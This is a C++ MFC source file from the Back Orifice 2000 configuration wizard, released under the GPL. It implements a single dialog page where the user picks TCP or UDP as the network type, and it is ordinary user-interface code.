/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */


// Wizard3.cpp : implementation file
//

#include "stdafx.h"
#include "bo2kcfg.h"
#include "Wizard3.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWizard3 dialog


CWizard3::CWizard3(CWnd* pParent /*=NULL*/)
	: CDialog(CWizard3::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWizard3)
	//}}AFX_DATA_INIT
}


void CWizard3::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWizard3)
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWizard3, CDialog)
	//{{AFX_MSG_MAP(CWizard3)
	ON_BN_CLICKED(IDBACK, OnBack)
	ON_WM_DESTROY()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWizard3 message handlers

void CWizard3::OnBack() 
{
	EndDialog(IDBACK);		
}

BOOL CWizard3::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	if(m_nNetType==0) {
		CheckRadioButton(IDC_TCPIO,IDC_UDPIO,IDC_TCPIO);
	} else {
		CheckRadioButton(IDC_TCPIO,IDC_UDPIO,IDC_UDPIO);
	}

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CWizard3::OnDestroy() 
{
	m_nNetType=IsDlgButtonChecked(IDC_TCPIO)?0:1;
	
	CDialog::OnDestroy();	
}
